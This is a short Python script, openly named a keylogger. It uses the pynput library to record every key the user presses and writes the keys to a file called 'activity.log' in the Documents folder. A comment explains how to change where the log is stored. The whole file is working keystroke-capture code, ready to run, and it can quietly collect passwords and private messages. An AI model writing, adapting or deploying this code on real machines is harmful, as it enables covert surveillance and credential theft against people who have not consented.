
import logging
from pynput import keyboard
import threading
import os

class Keylogger:

    def __init__(self, name):
        self._name = name

    @property
    def name(self):

        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        with keyboard.Listener(on_press=self._keydown_callback) as listener:
            listener.join()

    def _keydown_callback(self, key):
        try:
            logging.debug(f'{key.char}')
        except AttributeError:
            logging.debug(f'{key}') 


def run_keylogger():
    keylogger = Keylogger('SimpleKeylogger')
    keylogger.start_logging()


if __name__ == '__main__':

    documents_path = os.path.join(os.path.expanduser('~'), 'Documents') #Change 'Documents' to the path you want to store the logging info. (the path must be under C:\Users\your_user\)
    log_file_path = os.path.join(documents_path, 'activity.log') 
    
    logging.basicConfig(
        level=logging.DEBUG,
        filename=log_file_path,
        format='Key: %(message)s',
    )
    
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()
    keylogger_thread.join()
